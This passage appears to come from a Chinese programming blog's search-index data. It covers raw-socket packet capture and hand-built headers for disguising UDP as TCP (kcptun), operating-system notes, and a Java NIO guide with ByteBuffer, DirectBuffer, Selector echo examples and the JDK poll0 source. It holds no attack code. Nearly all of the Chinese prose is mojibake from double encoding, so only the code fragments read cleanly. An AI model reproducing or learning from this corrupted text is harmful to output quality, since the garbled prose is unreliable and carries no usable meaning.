dd[2], dd[3]); // printf(&quot;Source host:%s\\n&quot;, inet_ntoa(iph-&gt;saddr)); // printf(&quot;Dest host:%s\\n&quot;, inet_ntoa(iph-&gt;daddr)); } } return 0; } é¡ºä¾¿æä¸€ä¸‹ï¼Œä¸€èˆ¬æˆ‘ä»¬åœ¨Linuxæœºå™¨ä¸Šæ˜¯å¯ä»¥æŸ¥çœ‹åˆ°å½“å‰ç³»ç»Ÿå¯¹åº”çš„å†…æ ¸çš„å¤´æ–‡ä»¶çš„ root][~]# grep -n â€˜ethhdrâ€™ /usr/include/linux/if_ether.h107:struct ethhdr {[root][~]#[root][~]# grep -n â€˜iphdrâ€™ /usr/include/linux/*/usr/include/linux/if_tunnel.h:32: struct iphdr iph;/usr/include/linux/ip.h:85:struct iphdr { ä»raw socketä»‹ç»ä¸­å­¦åˆ°çš„ä¸œè¥¿ æ¥ä¸‹æ¥æˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸‹ç½‘å¡æ˜¯æ€ä¹ˆæ”¶æŠ¥çš„ï¼Œå¦‚æœä½ å¯¹è¿™éƒ¨åˆ†å·²ç»å¾ˆäº†è§£å¯ä»¥è·³è¿‡è¿™éƒ¨åˆ†å†…å®¹ã€‚ç½‘å¡ä»çº¿è·¯ä¸Šæ”¶åˆ°ä¿¡å·æµï¼Œç½‘å¡çš„é©±åŠ¨ç¨‹åºä¼šå»æ£€æŸ¥æ•°æ®å¸§å¼€å§‹çš„å‰6ä¸ªå­—èŠ‚ï¼Œå³ç›®çš„ä¸»æœºçš„MACåœ°å€ï¼Œå¦‚æœå’Œè‡ªå·±çš„ç½‘å¡åœ°å€ä¸€è‡´å®ƒæ‰ä¼šæ¥æ”¶è¿™ä¸ªå¸§ï¼Œä¸ç¬¦åˆçš„ä¸€èˆ¬éƒ½æ˜¯ç›´æ¥æ— è§†ã€‚ç„¶åè¯¥æ•°æ®å¸§ä¼šè¢«ç½‘ç»œé©±åŠ¨ç¨‹åºåˆ†è§£ï¼ŒIPæŠ¥æ–‡å°†é€šè¿‡ç½‘ç»œåè®®æ ˆï¼Œæœ€åä¼ é€åˆ°åº”ç”¨ç¨‹åºé‚£é‡Œã€‚å¾€ä¸Šå±‚ä¼ é€’çš„è¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªæ ¡éªŒå’Œâ€œå‰¥å¤´â€çš„è¿‡ç¨‹ï¼Œç”±åè®®æ ˆå„å±‚å»å®ç°ã€‚ setsockopt (packet_send_sd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) // IP_HDRINCL to tell the kernel that headers are included in the packetè¿™æ ·è®¾ç½®å‘Šè¯‰å†…æ ¸ï¼Œip packetçš„headerå°†ç”±æˆ‘ä»¬è‡ªå·±æ·»åŠ ï¼Œæ‰€ä»¥æœ€ç»ˆå‘é€å‡ºå»çš„å†…å®¹éœ€è¦å®Œå…¨ç”±è‡ªå·±å†³å®šã€‚ ä¸ºäº†å°†ä¸€ä¸ªudpåŒ…ä¼ªè£…æˆtcpåŒ…ï¼Œéœ€è¦ä¸€ä¸ªSOCK_RAWçš„socket socket(AF_INET , SOCK_RAW , IPPROTO_TCP) æ¥ä¸‹æ¥å°±æ˜¯è‡ªå·±ç»„è£…tcpåŒ…ç»“æ„ï¼Œtbd(è¿™ä¸ªä¸åŒçš„ç½‘å¡çš„å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œæœ€ç®€å•çš„å°±æ˜¯æŠ“åŒ…å°±å¯ä»¥äº†) pythonä¹Ÿæä¾›äº†å¯¹åº”rawsocketçš„api socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) å‚è€ƒkcptun-rawï¼šåº”å¯¹UDP QoSï¼Œé‡æ–°å®ç°kcptunçš„ä¸€æ¬¡å°è¯•some_kcptun_toolskcptun-rawtcpé‚£äº›äº‹ tcpåè®®ä¸ºäº†å¯¹å¤–å®ç°å¯é äº¤ä»˜ï¼Œå†…éƒ¨å®ç°æœ‰å¾ˆå¤šéå¸¸å¤æ‚çš„ç®—æ³•ã€‚javaå¹¶ä¸æ”¯æŒraw socketï¼Œæœ€å¤šç”¨jniåŒ…è£…ä¸€ä¸‹","tags":[{"name":"c","slug":"c","permalink":"https://haldir65.github.io/tags/c/"}]},{"title":"æ“ä½œç³»ç»ŸåŸç†","date":"2019-01-10T22:32:11.000Z","path":"2019/01/10/2019-01-10-operating-system-related-topics/","text":"æ“ä½œç³»ç»ŸåŸç†çš„ä¸€äº›è®°å½• æ“ä½œç³»ç»Ÿæ˜¯å¦‚ä½•åšå¥½æ–­ç”µä¿æŠ¤çš„ï¼Ÿæ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼ˆjournaling file systemï¼‰æ˜¯ä¸€ä¸ªå…·æœ‰æ•…éšœæ¢å¤èƒ½åŠ›çš„æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå› ä¸ºå¯¹ç›®å½•ä»¥åŠä½å›¾çš„æ›´æ–°ä¿¡æ¯æ€»æ˜¯åœ¨åŸå§‹çš„ç£ç›˜æ—¥å¿—è¢«æ›´æ–°ä¹‹å‰å†™åˆ°ç£ç›˜ä¸Šçš„ä¸€ä¸ªè¿ç»­çš„æ—¥å¿—ä¸Šï¼Œæ‰€ä»¥å®ƒä¿è¯äº†æ•°æ®çš„å®Œæ•´æ€§ã€‚å½“å‘ç”Ÿç³»ç»Ÿé”™è¯¯æ—¶ï¼Œä¸€ä¸ªå…¨æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿå°†ä¼šä¿è¯ç£ç›˜ä¸Šçš„æ•°æ®æ¢å¤åˆ°å‘ç”Ÿç³»ç»Ÿå´©æºƒå‰çš„çŠ¶æ€ã€‚åŒæ—¶ï¼Œå®ƒè¿˜å°†è¦†ç›–æœªä¿å­˜çš„æ•°æ®ï¼Œå¹¶å°†å…¶å­˜åœ¨å¦‚æœè®¡ç®—æœºæ²¡æœ‰å´©æºƒçš„è¯è¿™äº›æ•°æ®å¯èƒ½å·²ç»é—å¤±çš„ä½ç½®ï¼Œè¿™æ˜¯å¯¹å…³é”®ä¸šåŠ¡åº”ç”¨æ¥è¯´çš„ä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹æ€§ã€‚ å†…å­˜ä¸­æ®µå’Œåˆ†é¡µçš„è¯­ä¹‰æ˜¯ä»€ä¹ˆlinux disk I/O SchedulerI/O Schedulerssdçš„ä¸hddçš„ç­–ç•¥åº”ä¸åŒ ä¸ºä»€ä¹ˆç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢è€—è´¹æ—¶é—´ç”¨æˆ·æ€ä¸å†…æ ¸æ€ å‚è€ƒä»å†…æ ¸æ–‡ä»¶ç³»ç»Ÿçœ‹æ–‡ä»¶è¯»å†™è¿‡ç¨‹è®¡ç®—æœºåº•å±‚çŸ¥è¯†æ‹¾é—","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"java nioä½¿ç”¨æŒ‡å—","date":"2019-01-10T22:25:50.000Z","path":"2019/01/10/2019-01-10-java-nio-intro/","text":"å…³äºjava nioçš„ä¸€äº›ç‚¹ æœ¬æ–‡å¤§å¤šæ•°å†…å®¹æ¥è‡ªçŸ¥ä¹ä¸“æ çš„å¤åˆ¶ç²˜è´´ï¼Œå› ä¸ºåˆ«äººå†™çš„æ¯”æˆ‘å¥½ nioåŠDirectByteBufferç›¸å…³æ“ä½œnioåŒ…å«äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ ¸å¿ƒçš„åº”è¯¥æ˜¯selectorDirectBufferè¿™ä¸ªä¸œè¥¿å¾ˆå®¹æ˜“è®²ï¼Œä¸€å¥è¯å°±èƒ½è¯´æ¸…æ¥šï¼šè¿™æ˜¯ä¸€å—åœ¨Javaå †å¤–åˆ†é…çš„ï¼Œå¯ä»¥åœ¨Javaç¨‹åºä¸­è®¿é—®çš„å†…å­˜ã€‚å…ˆæ¥è§£é‡Šä¸€ä¸‹å‡ ä¸ªå †æ˜¯ä»€ä¹ˆã€‚ä»¥32ä½ç³»ç»Ÿä¸ºä¾‹ï¼ˆ64ä½ç³»ç»Ÿä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åœ°å€ç©ºé—´æ›´å¤§è€Œå·²ï¼Œå†™èµ·æ¥æ²¡æœ‰32ä½ç³»ç»Ÿçœ‹ä¸Šå»é‚£ä¹ˆç®€æ´ï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºä¸€ä¸ªè¿›ç¨‹æä¾›4Gçš„åœ°å€ç©ºé—´ï¼Œæ¢å¥è¯è¯´ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ç”¨çš„å†…å­˜æ˜¯4Gã€‚åœ¨Linuxä¸Šï¼Œåˆä¸ºå†…æ ¸ç©ºé—´ç•™äº†1Gï¼Œå‰©ä¸‹çš„3Gæ˜¯å¯ä»¥ä¾›ç”¨æˆ·ä½¿ç”¨çš„(ç²—ç•¥æ¥çœ‹æ˜¯è¿™æ ·çš„)ã€‚è¿™1Gå°±å«åšå†…æ ¸ç©ºé—´ï¼Œ3Gè¢«ç§°ä¸ºç”¨æˆ·ç©ºé—´ã€‚ä¸€ä¸ªjavaè¿›ç¨‹ä¸‹ä¸è¿‡å¯¹äºæ“ä½œç³»ç»Ÿè€Œè¨€ï¼Œè‚¯å®šæ˜¯ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ã€‚æ‰€ä»¥jvaä¹Ÿå°±æœ‰äº†è¿™3Gçš„ä½¿ç”¨æƒã€‚jvmæƒ³è¦ä½¿ç”¨è¿™äº›å†…å­˜çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨mallocæ–¹æ³•å»æ‰¾æ“ä½œç³»ç»Ÿå»è¦ï¼ˆå…¶å®ä¸­é—´è¿˜éš”äº†ä¸€ä¸ªC runtimeï¼Œæˆ‘ä»¬ä¸å»ç®¡è¿™ä¸ªç»†èŠ‚ï¼ŒåªæŠŠmallocå¾€ä¸‹éƒ½çœ‹æˆæ˜¯æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ï¼Œå¹¶ä¸ä¼šå¸¦æ¥å¤ªå¤§çš„é—®é¢˜ï¼‰è€ŒJVMè¦æ¥çš„è¿™äº›çš„å†…å­˜ï¼Œæœ‰ä¸€å—æ˜¯ä¸“é—¨ä¾›Javaç¨‹åºåˆ›å»ºå¯¹è±¡ä½¿ç”¨çš„ï¼Œè¿™å—å†…å­˜åœ¨JVMä¸­è¢«ç§°ä¸ºå †(heap)ã€‚å †è¿™ä¸ªè¯å¿«è¢«ç”¨çƒ‚äº†ï¼Œæ“ä½œç³»ç»Ÿæœ‰å †çš„æ¦‚å¿µï¼ŒC runtimeä¹Ÿæœ‰ï¼ŒJVMé‡Œä¹Ÿæœ‰ï¼Œç„¶åè¿˜æœ‰ä¸€ç§æ•°æ®ç»“æ„ä¹Ÿå«å †.æˆ‘ä»¬ä½¿ç”¨æ™®é€šçš„ByteBufferï¼Œé‚£ä¹ˆè¿™ä¸ªByteBufferå°±ä¼šåœ¨Javaå †å†…ï¼Œè¢«JVMæ‰€ç®¡ç†ï¼š ByteBuffer buf = ByteBuffer.allocate(1024); åœ¨æ‰§è¡ŒGCçš„æ—¶å€™ï¼ŒJVMå®é™…ä¸Šä¼šåšä¸€äº›æ•´ç†å†…å­˜çš„å·¥ä½œï¼Œä¹Ÿå°±è¯´bufè¿™ä¸ªå¯¹è±¡åœ¨å†…å­˜ä¸­çš„å®é™…åœ°å€æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„ã€‚æœ‰äº›æ—¶å€™ï¼ŒByteBufferé‡Œéƒ½æ˜¯å¤§é‡çš„å­—èŠ‚ï¼Œè¿™äº›å­—èŠ‚åœ¨JVM GCæ•´ç†å†…å­˜æ—¶å°±æ˜¾å¾—å¾ˆç¬¨é‡ï¼ŒæŠŠå®ƒä»¬åœ¨å†…å­˜ä¸­æ‹·æ¥æ‹·å»æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚é‚£è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¼šæƒ³èƒ½ä¸èƒ½ç»™æˆ‘ä¸€å—å†…å­˜ï¼Œå¯ä»¥è„±ç¦»JVMçš„ç®¡ç†å‘¢ï¼Ÿåœ¨è¿™æ ·çš„èƒŒæ™¯ä¸‹ï¼Œå°±æœ‰äº†DirectBufferã€‚å…ˆçœ‹ä¸€ä¸‹ç”¨æ³•ï¼š ByteBuffer buf = ByteBuffer.allocateDirect(1024); è¿™ä¸¤ä¸ªå‡½æ•°çš„å®ç°æ˜¯æœ‰åŒºåˆ«çš„: public static ByteBuffer allocateDirect(int capacity) { return new DirectByteBuffer(capacity); } public static ByteBuffer allocate(int capacity) { if (capacity &lt; 0) throw new IllegalArgumentException(); return new HeapByteBuffer(capacity, capacity); } DirectByteBufferçš„æ ¸å¿ƒå°±æ˜¯è°ƒç”¨äº† unsafe.allocateMemory(size)æ–¹æ³•ã€‚Javaå¯¹è±¡åœ¨Javaå †é‡Œç”³è¯·å†…å­˜çš„æ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯æ¯”mallocè¦å¿«çš„ï¼Œæ‰€ä»¥DirectBufferçš„åˆ›å»ºæ•ˆç‡å¾€å¾€æ˜¯æ¯”Heap Bufferå·®çš„ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿›è¡Œç½‘ç»œè¯»å†™æˆ–è€…æ–‡ä»¶è¯»å†™çš„æ—¶å€™ï¼ŒDirectBufferå°±ä¼šæ¯”è¾ƒå¿«äº†ã€‚ è¯´èµ·æ¥å¥½ç¬‘ï¼Œè¿™ä¸ªå¿«æ˜¯å› ä¸ºJDKæ•…æ„æŠŠéDirectBufferçš„è¯»å†™ææ…¢çš„ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹JDKçš„æºä»£ç ã€‚share/classes/sun/nio/ch/IOUtil.java static int write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) throws IOException { if (src instanceof DirectBuffer) return writeFromNativeBuffer(fd, src, position, nd); // Substitute a native buffer int pos = src.position(); int lim = src.limit(); assert (pos &lt;= lim); int rem = (pos &lt;= lim ? lim - pos : 0); ByteBuffer bb = Util.getTemporaryDirectBuffer(rem); try { bb.put(src); bb.flip(); // ................ç•¥ å¦‚æœsrcæ˜¯DirectBufferï¼Œå°±ç›´æ¥è°ƒç”¨writeFromNativeBufferï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¦å…ˆåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„DirectBufferï¼ŒæŠŠsrcæ‹·è¿›å»ï¼Œç„¶åå†è°ƒç”¨çœŸæ­£çš„å†™æ“ä½œã€‚ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå¹²å‘¢ï¼Ÿè¿˜æ˜¯è¦ä»DirectBufferä¸ä¼šè¢«GCç§»åŠ¨è¯´èµ·ã€‚writeFromNativeBufferçš„å®ç°ï¼Œæœ€ç»ˆä¼šæŠŠBufferçš„addressä¼ ç»™æ“ä½œç³»ç»Ÿï¼Œè®©æ“ä½œç³»ç»ŸæŠŠaddresså¼€å§‹çš„é‚£ä¸€æ®µå†…å­˜å‘é€åˆ°ç½‘ç»œä¸Šã€‚è¿™å°±è¦æ±‚åœ¨æ“ä½œç³»ç»Ÿè¿›è¡Œå‘é€çš„æ—¶å€™ï¼Œè¿™å—å†…å­˜æ˜¯ä¸èƒ½åŠ¨çš„(jniè°ƒç”¨ä¼ é€’çš„æ˜¯åœ°å€ï¼Œåœ°å€ä¸èƒ½ä¹±åŠ¨)ã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼ŒGCæ˜¯ä¼šä¹±æ¬Javaå †é‡Œçš„ä¸œè¥¿çš„ï¼Œæ‰€ä»¥æ— å¥ˆï¼Œæˆ‘ä»¬å¿…é¡»å¾—å¼„ä¸€å—åœ°å€ä¸ä¼šå˜åŒ–çš„å†…å­˜ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€å‘ç»™æ“ä½œç³»ç»Ÿã€‚ å¸¸ç”¨çš„ByteBufferæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªbyte[]ï¼ŒåŒ…æ‹¬è¿™ä¹ˆå‡ ä¸ªå˜é‡å®¹é‡ï¼ˆCapacityï¼‰ ç¼“å†²åŒºèƒ½å¤Ÿå®¹çº³çš„æ•°æ®å…ƒç´ çš„æœ€å¤§æ•°é‡ã€‚å®¹é‡åœ¨ç¼“å†²åŒºåˆ›å»ºæ—¶è¢«è®¾å®šï¼Œå¹¶ä¸”æ°¸è¿œä¸èƒ½è¢«æ”¹å˜ã€‚ä¸Šç•Œï¼ˆLimitï¼‰ ç¼“å†²åŒºé‡Œçš„æ•°æ®çš„æ€»æ•°ï¼Œä»£è¡¨äº†å½“å‰ç¼“å†²åŒºä¸­ä¸€å…±æœ‰å¤šå°‘æ•°æ®ã€‚ä½ç½®ï¼ˆPositionï¼‰ ä¸‹ä¸€ä¸ªè¦è¢«è¯»æˆ–å†™çš„å…ƒç´ çš„ä½ç½®ã€‚Positionä¼šè‡ªåŠ¨ç”±ç›¸åº”çš„ get( )å’Œ put( )å‡½æ•°æ›´æ–°ã€‚æ ‡è®°ï¼ˆMarkï¼‰ ä¸€ä¸ªå¤‡å¿˜ä½ç½®ã€‚ç”¨äºè®°å½•ä¸Šä¸€æ¬¡è¯»å†™çš„ä½ç½®ã€‚ä¸€ä¼šå„¿ï¼Œæˆ‘ä¼šé€šè¿‡resetæ–¹æ³•æ¥è¯´æ˜è¿™ä¸ªå±æ€§çš„å«ä¹‰ã€‚ByteBufferæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½newå‡ºæ¥ ByteBuffer byteBuffer = ByteBuffer.allocate(256); ä»¥ä¸Šçš„è¯­å¥å¯ä»¥åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º256å­—èŠ‚çš„ByteBufferï¼Œæ­¤æ—¶ï¼Œmark = -1, pos = 0, limit = 256, capacity = 256ã€‚capacityåœ¨åˆå§‹åŒ–çš„æ—¶å€™ç¡®å®šäº†ï¼Œè¿è¡Œæ—¶å°±ä¸ä¼šå†å˜åŒ–äº†ï¼Œè€Œå¦å¤–ä¸‰ä¸ªå˜é‡æ˜¯éšç€ç¨‹åºçš„æ‰§è¡Œè€Œä¸æ–­å˜åŒ–çš„ã€‚ ç”±äºæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]ï¼Œè¯»æ•°æ®çš„æ—¶å€™positionæ”¾åˆ°0, limitæ”¾åˆ°å½“å‰å·²ç»å­˜æ”¾çš„æ•°æ®çš„ä½ç½®ï¼Œè¯»å®Œä¸ºæ­¢ã€‚å†™æ•°æ®çš„æ—¶å€™ä¹Ÿå·®ä¸å¤šï¼Œpositionæ”¾åˆ°å½“å‰å·²ç»å­˜æ”¾çš„æ•°æ®çš„curIndex+1ï¼Œlimitæ”¾åˆ°capicityçš„ä½ç½®ï¼Œå¡«æ»¡ä¸ºæ­¢ã€‚ ä»è¯»å˜æˆå†™å¯ä»¥è¿™ä¹ˆå¹² byteBuffer.limit(byteBuffer.position()) byteBuffer.position(0); //ç”±äºè¿™ä¸ªæ–¹æ³•å®åœ¨å¤ªé¢‘ç¹,jdkå°±å¸®å¿™å°è£…äº†ä¸€ä¸ªå«åšflipçš„æ–¹æ³• public final Buffer flip() { limit = position; position = 0; mark = -1; return this; } æ˜¾ç„¶è¿ç»­è°ƒç”¨flipä¼šå¯¼è‡´limitå˜æˆ0ï¼Œä¸èƒ½è¯»ä¹Ÿä¸èƒ½å†™äº†ã€‚markæ–¹æ³•ç±»ä¼¼äºæ‰“ä¸€ä¸ªæ ‡è®°ï¼Œå¾…ä¼šå„¿é€šè¿‡resetå›åˆ°è¿™ä¸ªpositionã€‚ javaçš„byteæ•°ç»„åœ¨å†…å­˜å±‚é¢ä¸ä¸€å®šæ˜¯è¿ç»­çš„ï¼ŒCè¯­è¨€é‡Œé¢æ˜¯è¿ç»­çš„åŸå› æ˜¯GCä¼šæŒªåŠ¨å†…å­˜ï¼Œæ‰€ä»¥DirectByteBufferå­˜åœ¨çš„ä¸»è¦æ„ä¹‰æ˜¯ä¸ºäº†ç»™cè¯­è¨€å±‚è°ƒç”¨æä¾›è¿ç»­çš„å†…å­˜ã€‚ nioçš„channelåœ¨Java IOä¸­ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥åˆ†ä¸ºæ–‡ä»¶ç±»å’ŒStreamç±»ä¸¤å¤§ç±»ã€‚Channel ä¹Ÿç›¸åº”åœ°åˆ†ä¸ºäº†FileChannel å’Œ Socket Channelï¼Œå…¶ä¸­ socket channel åˆåˆ†ä¸ºä¸‰å¤§ç±»ï¼Œä¸€ä¸ªæ˜¯ç”¨äºç›‘å¬ç«¯å£çš„ServerSocketChannelï¼Œç¬¬äºŒç±»æ˜¯ç”¨äºTCPé€šä¿¡çš„SocketChannelï¼Œç¬¬ä¸‰ç±»æ˜¯ç”¨äºUDPé€šä¿¡çš„DatagramChannelã€‚channel æœ€ä¸»è¦çš„ä½œç”¨è¿˜æ˜¯ç”¨äºéé˜»å¡å¼è¯»å†™ã€‚å¯ä»¥ä½¿ç”¨Channelç»“åˆByteBufferè¿›è¡Œè¯»å†™ã€‚ä¸€ä¸ªç®€å•çš„client server echoç¨‹åºå¯ä»¥è¿™æ ·å†™ // server public class WebServer { public static void main(String args[]) { try { ServerSocketChannel ssc = ServerSocketChannel.open(); ssc.socket().bind(new InetSocketAddress(&quot;127.0.0.1&quot;, 8000)); SocketChannel socketChannel = ssc.accept(); ByteBuffer readBuffer = ByteBuffer.allocate(128); socketChannel.read(readBuffer); readBuffer.flip(); while (readBuffer.hasRemaining()) { System.out.println((char)readBuffer.get()); } socketChannel.close(); ssc.close(); } catch (IOException e) { e.printStackTrace(); } } } // client public class WebClient { public static void main(String[] args) { SocketChannel socketChannel = null; try { socketChannel = SocketChannel.open(); socketChannel.connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 8000)); ByteBuffer writeBuffer = ByteBuffer.allocate(128); writeBuffer.put(&quot;hello world&quot;.getBytes()); writeBuffer.flip(); socketChannel.write(writeBuffer); socketChannel.close(); } catch (IOException e) { } } } Selectorjava.nio.channels.Selectoræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå› ä¸ºåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šçš„å®ç°ä¸ä¸€æ ·ã€‚ä½†åŸºæœ¬åŸç†æ˜¯ä¸€æ ·çš„ï¼Œæ‰€æœ‰çš„Channeléƒ½ç”±selectorç®¡ç†ï¼Œç”¨æˆ·å±‚å‘selectoræ³¨å†Œæ„Ÿå…´è¶£çš„IOåŠ¨ä½œï¼Œå¹¶é€šè¿‡selctor.selectæ–¹æ³•è½®è¯¢IOäº‹ä»¶ã€‚java nioä¸­ä¸»è¦çš„Channelçš„å®ç°åŒ…æ‹¬: FileChannel (å¤„ç†æ–‡ä»¶io) DatagramChannel (å¤„ç†udpé€šä¿¡) SocketChannel ï¼ˆé€šè¿‡tcpè¯»å–ç½‘ç»œæ•°æ®ï¼‰ ServerSocketChannel(æœåŠ¡ç«¯æ¥æ”¶ä¼ å…¥çš„tcpæ•°æ®) æ”¹è¿›ä¸€ä¸‹ä¸Šé¢çš„WebClientå’ŒWebServerã€‚ public class EpollServer { public static void main(String[] args) { try { ServerSocketChannel ssc = ServerSocketChannel.open(); ssc.socket().bind(new InetSocketAddress(&quot;127.0.0.1&quot;, 8001)); ssc.configureBlocking(false); Selector selector = Selector.open(); // æ³¨å†Œ channelï¼Œå¹¶ä¸”æŒ‡å®šæ„Ÿå…´è¶£çš„äº‹ä»¶æ˜¯ Accept ssc.register(selector, SelectionKey.OP_ACCEPT); ByteBuffer readBuff = ByteBuffer.allocate(1024); ByteBuffer writeBuff = ByteBuffer.allocate(128); writeBuff.put(&quot;received&quot;.getBytes()); writeBuff.flip(); while (true) { int nReady = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; it = keys.iterator(); while (it.hasNext()) { SelectionKey key = it.next(); it.remove(); if (key.isAcceptable()) { // åˆ›å»ºæ–°çš„è¿æ¥ï¼Œå¹¶ä¸”æŠŠè¿æ¥æ³¨å†Œåˆ°selectorä¸Šï¼Œè€Œä¸”ï¼Œ // å£°æ˜è¿™ä¸ªchannelåªå¯¹è¯»æ“ä½œæ„Ÿå…´è¶£ã€‚ SocketChannel socketChannel = ssc.accept(); socketChannel.configureBlocking(false); socketChannel.register(selector, SelectionKey.OP_READ); } else if (key.isReadable()) { SocketChannel socketChannel = (SocketChannel) key.channel(); readBuff.clear(); socketChannel.read(readBuff); readBuff.flip(); System.out.println(&quot;received : &quot; + new String(readBuff.array())+&quot; at &quot;+ System.currentTimeMillis()); key.interestOps(SelectionKey.OP_WRITE); } else if (key.isWritable()) { writeBuff.rewind(); SocketChannel socketChannel = (SocketChannel) key.channel(); socketChannel.write(writeBuff); System.out.println(&quot;dispatched msg to client : &quot; + new String(writeBuff.array())+&quot; at &quot;+ System.currentTimeMillis()); key.interestOps(SelectionKey.OP_READ); } } } } catch (IOException e) { e.printStackTrace(); } } } public class EpollClient { public static void main(String[] args) { try { SocketChannel socketChannel = SocketChannel.open(); socketChannel.connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 8001)); ByteBuffer writeBuffer = ByteBuffer.allocate(32); ByteBuffer readBuffer = ByteBuffer.allocate(32); writeBuffer.put(&quot;hello&quot;.getBytes()); writeBuffer.flip(); while (true) { writeBuffer.rewind(); socketChannel.write(writeBuffer); readBuffer.clear(); socketChannel.read(readBuffer); System.out.println(&quot;received from server :&quot; + new String(readBuffer.array())); } } catch (IOException e) { e.printStackTrace(); } } } è¿™å¥—å¤„ç†ioäº‹ä»¶çš„ç¨‹åºæ¨¡å‹åœ¨pythonä¸­ä¹Ÿæœ‰å¯¹åº”çš„selectoræ¨¡å—ï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿæ˜¯ç›¸è¿‘çš„ã€‚å› ä¸ºæ— è®ºæ˜¯javaè¿˜æ˜¯pythonï¼Œéƒ½æ˜¯å¯¹æ“ä½œç³»ç»Ÿä¸Šçš„cè¯­è¨€apiçš„select,poll,epollç³»ç»Ÿè°ƒç”¨è¿›è¡Œäº†å°è£…ã€‚SelectionKeyç±»ä¼¼äºepollä¸­çš„ä¸€ä¸ªäº‹ä»¶ï¼ŒåŒ…æ‹¬OP_READï¼ŒOP_WRITEï¼ŒOP_ACCEPTå’ŒOP_CONNECTã€‚äº‹å®ä¸Šä»openjdkæºç æ¥çœ‹ï¼Œç¡®å®æ˜¯å¯¹pollçš„å°è£… selctoråœ¨openjdkçš„å®ç°æ˜¯:selctor.select -&gt; PollSelectorImpl.doSelect -&gt; pollWrapper.poll -&gt; poll0 sun.nio.ch.PollArrayWrapper private native int poll0(long pollAddress, int numfds, long timeout); å¯¹åº”çš„cè¯­è¨€å®ç°åœ¨:jdk8u-jdk/src/solaris/native/sun/nio/ch/PollArrayWrapper.c #include &quot;jni.h&quot; #include &quot;jni_util.h&quot; #include &quot;jvm.h&quot; #include &quot;jlong.h&quot; #include &quot;sun_nio_ch_PollArrayWrapper.h&quot; #include &lt;poll.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/time.h&gt; JNIEXPORT jint JNICALL Java_sun_nio_ch_PollArrayWrapper_poll0(JNIEnv *env, jobject this, jlong address, jint numfds, jlong timeout) { struct pollfd *a; int err = 0; a = (struct pollfd *) jlong_to_ptr(address); if (timeout &lt;= 0) { /* Indefinite or no wait */ RESTARTABLE (poll(a, numfds, timeout), err); ## å°±æ˜¯è°ƒç”¨äº†poll } else { /* Bounded wait; bounded restarts */ err = ipoll(a, numfds, timeout); } if (err &lt; 0) { JNU_ThrowIOExceptionWithLastError(env, &quot;Poll failed&quot;); } return (jint)err; } windowså¹³å°çš„å®ç°æ˜¯sun.nio.ch.WindowsSelectorImpl.java MMAP(memory mapped file)å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ç©ºé—´çš„æ“ä½œï¼Œæ‡’å¾—çœ‹åŸç†çš„è¯ï¼ŒèƒŒä¸‹è¿™æ®µè¯å°±å¤Ÿäº† å¸¸è§„æ–‡ä»¶æ“ä½œéœ€è¦ä»ç£ç›˜åˆ°é¡µç¼“å­˜å†åˆ°ç”¨æˆ·ä¸»å­˜çš„ä¸¤æ¬¡æ•°æ®æ‹·è´ã€‚è€Œmmapæ“æ§æ–‡ä»¶ï¼Œåªéœ€è¦ä»ç£ç›˜åˆ°ç”¨æˆ·ä¸»å­˜çš„ä¸€æ¬¡æ•°æ®æ‹·è´è¿‡ç¨‹ã€‚è¯´ç™½äº†ï¼Œmmapçš„å…³é”®ç‚¹æ˜¯å®ç°äº†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„æ•°æ®ç›´æ¥äº¤äº’è€Œçœå»äº†ç©ºé—´ä¸åŒæ•°æ®ä¸é€šçš„ç¹çè¿‡ç¨‹ã€‚å› æ­¤mmapæ•ˆç‡æ›´é«˜ 